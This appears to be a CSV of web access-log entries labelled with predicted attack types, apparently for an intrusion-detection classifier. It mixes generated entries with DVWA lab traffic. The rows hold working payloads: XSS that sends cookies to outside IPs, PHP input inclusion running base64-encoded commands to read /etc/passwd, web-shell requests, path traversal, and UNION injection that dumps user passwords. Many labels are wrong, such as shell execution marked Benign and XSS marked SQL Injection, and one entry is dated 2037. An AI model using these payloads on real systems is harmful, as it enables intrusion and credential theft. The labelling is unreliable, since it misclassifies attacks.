IP,Timestamp,Logs,Prediction
237.160.154.8 , [22/May/2012:00:16:54 +0000] ,GET /?search=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F23.43.206.131%2F41465.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 5988 ,XSS
43.0.73.147 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F123.1.28.159%22%3C%2Fscript%3E HTTP/1.1  200 3637 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:50:08 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>\x0D\x0A] 200 1630 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630 ,Benign
192.168.180.129 , [13/Mar/2022:01:24:55 +0800] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,Local File Inclusion
86.3.196.210 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F56.39.156.16%22%3C%2Fscript%3E HTTP/1.1  200 6841 ,XSS
127.0.0.1 , [07/Mar/2023:10:43:10 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1  500 295 ,Benign
79.0.131.158 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F73.235.75.53%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 6767 ,XSS
232.214.7.229 , [25/Jun/2020:03:09:12 +0000] ,GET get-files?file=../../../../etc/passwd HTTP/1.1  200 1593 ,Local File Inclusion
73.91.150.125 , [27/Dec/2037:12:00:00 +0530] ,GET /usr HTTP/1.0  502 5028 ,SQL Injection
31.151.99.171 , [27/Aug/2011:03:09:46 +0000] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1  200 6265 ,Local File Inclusion
19.89.115.1 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1  200 7769 ,XSS
192.168.180.129 , [13/Mar/2022:00:29:53 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']); ?>] 200 53 ,SQL Injection
192.168.154.1 , [21/Feb/2022:14:45:25 +0800] ,GET /dvwa/vulnerabilities/view_help.php?id=xss_d&security=high&locale=en HTTP/1.1  [-] 200 1833 ,Local File Inclusion
192.168.154.136 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2C%60user%60%2Cavatar%2Cfailed_login%2Cfirst_name%2Clast_login%2Clast_name%2Cpassword%2Cuser_id%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.users--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
192.168.154.1 , [21/Feb/2022:13:32:01 +0800] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2202 ,Local File Inclusion
192.168.180.129 , [13/Mar/2022:00:35:57 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 1127 ,SQL Injection
192.168.154.1 , [21/Feb/2022:13:51:21 +0800] ,POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1  [txtName=aa&mtxMessage=%3Cscript%3E%3C%3E%3Cscript%3E&btnSign=Sign+Guestbook] 200 1736 ,Benign
58.95.86.85 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F106.96.219.229%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1  200 4549 ,XSS
192.168.180.129 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 200 842 ,Benign
192.168.180.129 , [13/Mar/2022:00:29:38 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
192.168.180.129 , [13/Mar/2022:00:04:49 +0800] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2202 ,Local File Inclusion
192.168.154.1 , [21/Feb/2022:14:13:35 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3D%25E2%2580%2599%23%25E2%2580%2599%2520onclick%3Dalert%25E2%2580%2599Gotcha%21%21%21%25E2%2580%2599%253E HTTP/1.1  [-] 200 1593 ,XSS
124.58.160.42 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3E%window.open%28%27http%3A%2F%2F225.58.123.236%2F688965%27%293C%2Fscript%3E HTTP/1.1  200 2108 ,XSS
